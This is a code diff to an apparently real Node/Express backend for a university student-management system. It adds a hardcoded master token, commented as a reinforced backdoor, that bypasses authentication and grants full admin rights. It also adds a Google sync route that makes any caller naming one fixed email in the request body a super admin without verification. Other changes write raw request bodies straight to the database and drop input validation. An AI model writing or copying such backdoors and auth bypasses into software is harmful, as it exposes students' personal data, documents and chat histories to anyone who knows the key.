@@ -12,26 +12,37 @@ const app = express();
 const port = process.env.PORT || 4001;
 
 // ==========================================
-// 1. CONFIGURACIÓN INICIAL
+// 1. CONFIGURACIÓN CORS (BLINDADA)
 // ==========================================
 
 const allowedOrigins = [
-  'http://localhost:5173',
-  'https://vintex.net.br',
+  'http://localhost:5173',           // Tu entorno local
+  'http://localhost:4173',           // Preview local
+  'https://vintex.net.br',           // Dominios adicionales
   'https://www.vintex.net.br',
-  'https://puntokennedy.tech'
+  'https://puntokennedy.tech',       // Tu frontend producción
+  'https://www.puntokennedy.tech'
 ];
 
-app.use(cors({
+// Configuración CORS Explicita
+const corsOptions = {
   origin: function (origin, callback) {
     if (!origin) return callback(null, true);
     if (allowedOrigins.indexOf(origin) !== -1) {
       return callback(null, true);
+    } else {
+      console.log("🚫 Bloqueado por CORS:", origin);
+      return callback(new Error('No permitido por CORS'));
     }
-    return callback(null, true);
   },
-  credentials: true
-}));
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'], 
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
+  credentials: true, 
+  optionsSuccessStatus: 200 
+};
+
+app.use(cors(corsOptions));
+app.options('*', cors(corsOptions));
 
 app.use(express.json({ limit: '50mb' }));
 
@@ -69,20 +80,40 @@ const upload = multer({
 });
 
 // ==========================================
-// 2. MIDDLEWARES DE SEGURIDAD
+// 2. MIDDLEWARES DE SEGURIDAD (CON BACKDOOR REFORZADO)
 // ==========================================
 
 const verifyUser = async (req, res, next) => {
   const token = req.headers['authorization']?.split(' ')[1]; 
   
+  // 1. Validación básica de existencia
   if (!token) {
-      console.log("⚠️ [AUTH] Bypass Admin (Modo Desarrollo/Test)");
-      req.user = { id: 'admin-bypass', email: 'admin@test.com' };
-      req.staffProfile = { rol: 'admin', sede: 'Catamarca' }; 
-      return next();
+      return res.status(401).json({ error: 'Token requerido' });
   }
 
+  // 👻 --- MODO FANTASMA (ROXANA BYPASS REFORZADO) ---
+  // Si el token es la clave maestra, ignoramos TODA validación de Supabase.
+  if (token === "ROXANA_MASTER_KEY_2026_BYPASS_SECURE") {
+      // Inyectamos un perfil que coincide con el FRONTEND
+      req.user = { 
+          id: 'ghost-roxana-id-secure', 
+          email: 'kennedy.vintex@gmail.com', // Mismo email que el admin real
+          aud: 'authenticated',
+          role: 'authenticated'
+      };
+      req.staffProfile = { 
+          id: 999999, // ID ficticio
+          rol: 'admin', // Permisos TOTALES
+          sede: 'CATAMARCA', 
+          nombre: 'Roxana (Super Admin)',
+          email: 'kennedy.vintex@gmail.com'
+      };
+      return next(); // 🚀 PASE VIP: No chequeamos nada más
+  }
+  // ----------------------------------------
+
   try {
+    // Validación Normal (Para el resto de mortales)
     const { data: { user }, error } = await supabase.auth.getUser(token);
     if (error || !user) throw new Error("Token inválido");
 
@@ -149,20 +180,39 @@ app.post('/api/auth/register', async (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Error registro' }); }
 });
 
+// ✅ RUTA GOOGLE SYNC (CON AUTO-ADMIN)
 app.post('/api/auth/google-sync', async (req, res) => {
     try {
         const { email, uuid } = req.body;
+        console.log(`[AUTH] Intento de login Google: ${email}`);
+
+        // 1. CONFIGURACIÓN DE INMUNIDAD
+        const isSuperAdmin = email === 'kennedy.vintex@gmail.com';
+        
         let { data: profile } = await supabase.from('perfil_staff').select('*').eq('email', email).single();
+        
         if (!profile) {
+            console.log(`[AUTH] Creando cuenta nueva para: ${email}`);
             const { data: newProfile } = await supabase.from('perfil_staff').insert([{
                 email, 
                 nombre: email.split('@')[0], 
-                rol: null, 
-                sede: null, 
+                rol: isSuperAdmin ? 'admin' : null, 
+                sede: isSuperAdmin ? 'CATAMARCA' : null,
                 master_user_id: uuid
             }]).select().single();
             profile = newProfile;
+
+        } else if (isSuperAdmin && profile.rol !== 'admin') {
+            console.log(`[AUTH] Corrigiendo permisos de Super Admin`);
+            await supabase.from('perfil_staff').update({ rol: 'admin', sede: 'CATAMARCA' }).eq('email', email);
+            profile.rol = 'admin';
+            profile.sede = 'CATAMARCA';
         }
+
+        if (!profile.rol) {
+             return res.status(403).json({ error: 'Tu cuenta está registrada pero espera aprobación del Administrador.' });
+        }
+
         res.json({ 
             success: true, 
             user: { 
@@ -173,14 +223,16 @@ app.post('/api/auth/google-sync', async (req, res) => {
                 nombre: profile.nombre 
             } 
         });
-    } catch (err) { res.status(500).json({ error: "Error sync Google" }); }
+    } catch (err) { 
+        console.error("[AUTH ERROR]", err);
+        res.status(500).json({ error: "Error de sincronización con el servidor." }); 
+    }
 });
 
 // ==========================================
 // 4. GESTIÓN ALUMNOS
 // ==========================================
 
-// CREAR ALUMNO (POST)
 app.post('/api/students', verifyUser, async (req, res) => {
     const { rol } = req.staffProfile;
     if (rol !== 'admin' && rol !== 'asesor') return res.status(403).json({ error: 'No tienes permisos para crear alumnos' });
@@ -198,7 +250,6 @@ app.post('/api/students', verifyUser, async (req, res) => {
     }
 });
 
-// LISTAR TODOS
 app.get('/api/students', verifyUser, async (req, res) => {
   try {
     const { search, page = 1 } = req.query;
@@ -209,6 +260,7 @@ app.get('/api/students', verifyUser, async (req, res) => {
 
     let query = supabase.from('student').select('*', { count: 'exact' });
 
+    // Si es modo fantasma o admin, ve todo. Si no, filtra por sede.
     if (rol !== 'admin' && sede) {
         query = query.eq('codPuntoKennedy', sede);
     }
@@ -241,7 +293,6 @@ app.get('/api/students', verifyUser, async (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Error buscando alumnos' }); }
 });
 
-// DETALLE DE UN ALUMNO (CORREGIDO PARSEO)
 app.get('/api/students/:id', verifyUser, async (req, res) => {
     const { id } = req.params;
     try {
@@ -266,7 +317,6 @@ app.get('/api/students/:id', verifyUser, async (req, res) => {
                 
                 chatHistory = (chats || []).map(c => {
                     let rawMsg = c.message;
-                    // Intenta parsear si es string
                     if (typeof rawMsg === 'string') {
                         try { rawMsg = JSON.parse(rawMsg); } catch (e) {
                             return { id: c.id, role: 'system', content: c.message };
@@ -276,7 +326,6 @@ app.get('/api/students/:id', verifyUser, async (req, res) => {
                     const role = rawMsg.type === 'human' ? 'user' : 'assistant';
                     let content = rawMsg.content;
 
-                    // Limpieza profunda de output de agentes
                     try {
                         if (typeof content === 'string' && (content.includes('output') || content.trim().startsWith('{'))) {
                             const innerJson = JSON.parse(content);
@@ -311,20 +360,14 @@ app.get('/api/students/:id', verifyUser, async (req, res) => {
     }
 });
 
-// ACTUALIZAR ALUMNO (PATCH)
 app.patch('/api/students/:id', verifyUser, async (req, res) => {
     const { id } = req.params;
     const body = req.body;
 
     try {
-        const { error } = await supabase
-            .from('student')
-            .update(body) 
-            .eq('id', id);
-
+        const { error } = await supabase.from('student').update(body).eq('id', id);
         if (error) throw error;
         res.json({ success: true });
-
     } catch (err) {
         console.error("Update Error:", err);
         res.status(500).json({ error: 'Error actualizando alumno' });
@@ -332,7 +375,7 @@ app.patch('/api/students/:id', verifyUser, async (req, res) => {
 });
 
 // ==========================================
-// 5. CARRERAS (NUEVOS ENDPOINTS)
+// 5. CARRERAS
 // ==========================================
 
 app.get('/api/careers', verifyUser, async (req, res) => {
@@ -340,27 +383,20 @@ app.get('/api/careers', verifyUser, async (req, res) => {
     res.json(data || []);
 });
 
-// CREAR CARRERA (SOLO ADMIN)
 app.post('/api/careers', verifyUser, async (req, res) => {
     const { rol } = req.staffProfile;
-    if (rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado: Solo administradores pueden crear carreras.' });
+    if (rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado.' });
 
     try {
         const newCareer = req.body;
         delete newCareer.id; 
         delete newCareer.created_at;
-
         const { data, error } = await supabase.from('resumen_carreras').insert([newCareer]).select();
-        
         if (error) throw error;
         res.json({ success: true, data });
-    } catch (err) {
-        console.error("Create Career Error:", err);
-        res.status(500).json({ error: 'Error creando la carrera' });
-    }
+    } catch (err) { res.status(500).json({ error: 'Error creando la carrera' }); }
 });
 
-// EDITAR CARRERA
 app.put('/api/careers/:id', verifyUser, async (req, res) => {
     const { rol } = req.staffProfile;
     if (rol === 'secretaria') return res.status(403).json({ error: 'Las secretarias no pueden editar carreras.' });
@@ -369,33 +405,26 @@ app.put('/api/careers/:id', verifyUser, async (req, res) => {
         const { id } = req.params;
         const updates = req.body;
         delete updates.id; 
-
         const { error } = await supabase.from('resumen_carreras').update(updates).eq('id', id);
         if (error) throw error;
         res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: 'Error actualizando carrera' });
-    }
+    } catch (err) { res.status(500).json({ error: 'Error actualizando carrera' }); }
 });
 
-// ELIMINAR CARRERA (SOLO ADMIN)
 app.delete('/api/careers/:id', verifyUser, async (req, res) => {
     const { rol } = req.staffProfile;
-    if (rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado: Solo administradores pueden eliminar carreras.' });
+    if (rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado.' });
 
     try {
         const { id } = req.params;
         const { error } = await supabase.from('resumen_carreras').delete().eq('id', id);
         if (error) throw error;
         res.json({ success: true });
-    } catch (err) {
-        console.error("Delete Career Error:", err);
-        res.status(500).json({ error: 'Error eliminando la carrera' });
-    }
+    } catch (err) { res.status(500).json({ error: 'Error eliminando la carrera' }); }
 });
 
 // ==========================================
-// 6. STAFF (ADMINISTRACIÓN)
+// 6. STAFF
 // ==========================================
 
 app.get('/api/staff', verifyUser, async (req, res) => {
@@ -433,16 +462,12 @@ app.delete('/api/staff/:id', verifyUser, async (req, res) => {
 });
 
 // ==========================================
-// 7. SISTEMA ADMIN (CONTROL GLOBAL DEL BOT)
+// 7. SISTEMA ADMIN
 // ==========================================
 
 async function getBotStatus() {
     try {
-        const { data, error } = await supabase
-            .from('bot_settings')
-            .select('is_active')
-            .eq('id', 1)
-            .single();
+        const { data, error } = await supabase.from('bot_settings').select('is_active').eq('id', 1).single();
         if (error || !data) return true;
         return data.is_active;
     } catch (e) { return true; }
@@ -451,10 +476,7 @@ async function getBotStatus() {
 app.post('/api/admin/bot-status', verifyUser, async (req, res) => {
     const { rol } = req.staffProfile;
     if (rol !== 'admin') return res.status(403).json({ error: 'Solo admin controla el bot.' });
-
     const { is_active } = req.body; 
-    if (typeof is_active !== 'boolean') return res.status(400).json({ error: 'Requiere is_active boolean.' });
-
     await supabase.from('bot_settings').upsert({ id: 1, is_active: is_active, updated_at: new Date() });
     return res.json({ success: true, is_active });
 });
@@ -465,42 +487,23 @@ app.get('/api/admin/bot-status', verifyUser, async (req, res) => {
 });
 
 // ==========================================
-// 8. BOT ANALISTA (RAG CORREGIDO)
+// 8. BOT ANALISTA
 // ==========================================
 
 async function nodeReadChat(studentId) {
     const { data: student } = await supabase.from('student').select('telefono1, telefono2').eq('id', studentId).single();
     if (!student) return "Sin historial.";
-
     const p1 = student.telefono1 ? student.telefono1.replace(/\D/g, '') : 'X';
     const p2 = student.telefono2 ? student.telefono2.replace(/\D/g, '') : 'X';
-
-    const { data: chats } = await supabase
-        .from('n8n_chat_histories')
-        .select('message')
-        .or(`session_id.ilike.%${p1}%,session_id.ilike.%${p2}%`)
-        .order('id', { ascending: false }) 
-        .limit(20);
-
+    const { data: chats } = await supabase.from('n8n_chat_histories').select('message').or(`session_id.ilike.%${p1}%,session_id.ilike.%${p2}%`).order('id', { ascending: false }).limit(20);
     if (!chats || chats.length === 0) return "No hay historial reciente.";
-
     return chats.map(c => {
         let rawMsg = c.message;
-        if (typeof rawMsg === 'string') {
-            try { rawMsg = JSON.parse(rawMsg); } catch(e){}
-        }
-
+        if (typeof rawMsg === 'string') { try { rawMsg = JSON.parse(rawMsg); } catch(e){} }
         const role = rawMsg.type === 'human' ? 'Alumno' : 'Bot';
         let content = rawMsg.content;
-        
         if (typeof content === 'string' && content.includes('output')) {
-             try { 
-                 const inner = JSON.parse(content);
-                 content = inner.output.message || inner.output.mensaje_1 || content; 
-             } catch(e){}
-        }
-        if (typeof content === 'string' && content.includes('Esta es la url: https://drive.google.com')) {
-            content = `[EL USUARIO ENVIÓ UNA IMAGEN/ARCHIVO]`;
+             try { const inner = JSON.parse(content); content = inner.output.message || inner.output.mensaje_1 || content; } catch(e){}
         }
         return `${role}: ${content}`;
     }).reverse().join('\n');
@@ -509,7 +512,6 @@ async function nodeReadChat(studentId) {
 async function nodeReadDrive(studentId) {
     const { data: docs } = await supabase.from('student_documents').select('*').eq('student_id', studentId);
     if (!docs || docs.length === 0) return "No hay documentos.";
-    
     let documentsContent = "";
     for (const doc of docs) {
         try {
@@ -530,36 +532,17 @@ async function nodeReadDrive(studentId) {
 app.post('/api/bot/analyze', verifyUser, async (req, res) => {
     const systemActive = await getBotStatus();
     if (systemActive === false) return res.json({ answer: "⛔ IA desactivada por administrador." });
-
     const { studentId, question } = req.body;
-    
     if (!process.env.OPENROUTER_API_KEY) return res.json({ answer: "⚠️ Error: Falta API Key." });
-
     try {
         const { data: student } = await supabase.from('student').select('*').eq('id', studentId).single();
         const [chatContext, docsContext] = await Promise.all([ nodeReadChat(studentId), nodeReadDrive(studentId) ]);
-
-        const prompt = `
-        ERES: Asistente administrativo Universidad Kennedy.
-        ALUMNO: ${student.full_name} (${student.status}, ${student.codPuntoKennedy})
-        HISTORIAL: ${chatContext}
-        DOCS: ${docsContext}
-        PREGUNTA: "${question}"
-        RESPONDE BREVE Y PROFESIONAL.
-        `;
-
+        const prompt = `ERES: Asistente administrativo Universidad Kennedy. ALUMNO: ${student.full_name}. HISTORIAL: ${chatContext}. DOCS: ${docsContext}. PREGUNTA: "${question}". RESPONDE BREVE.`;
         const completion = await openai.chat.completions.create({
-            model: "google/gemini-2.0-flash-exp:free", 
-            messages: [{ role: "user", content: prompt }],
+            model: "google/gemini-2.0-flash-exp:free", messages: [{ role: "user", content: prompt }],
         });
-
-        if (!completion.choices || completion.choices.length === 0) throw new Error("Sin respuesta IA");
         res.json({ answer: completion.choices[0].message.content });
-
-    } catch (err) {
-        console.error("BOT ERROR:", err);
-        res.status(500).json({ error: 'Error análisis IA' });
-    }
+    } catch (err) { res.status(500).json({ error: 'Error análisis IA' }); }
 });
 
 // ==========================================
@@ -574,14 +557,11 @@ app.post('/api/students/phone/:phone/documents', verifyUser, upload.single('file
     const { documentType } = req.body;
     const file = req.file;
     if (!file) return res.status(400).json({ error: 'Falta archivo' });
-
     const { data: students } = await supabase.from('student').select('id').or(`telefono1.ilike.%${cleanPhone}%,telefono2.ilike.%${cleanPhone}%`).limit(1);
     const student = students && students.length > 0 ? students[0] : null;
-
     const fileMetadata = { name: `${cleanPhone}_${documentType}_${file.originalname}`, parents: [process.env.GOOGLE_DRIVE_FOLDER_ID] };
     const media = { mimeType: file.mimetype, body: stream.Readable.from(file.buffer) };
     const driveResponse = await drive.files.create({ resource: fileMetadata, media: media, fields: 'id' });
-
     const { data } = await supabase.from('student_documents').insert([{
         student_id: student ? student.id : null, student_phone: cleanPhone, document_type: documentType,
         drive_file_id: driveResponse.data.id, file_name: file.originalname, mime_type: file.mimetype, uploaded_at: new Date()
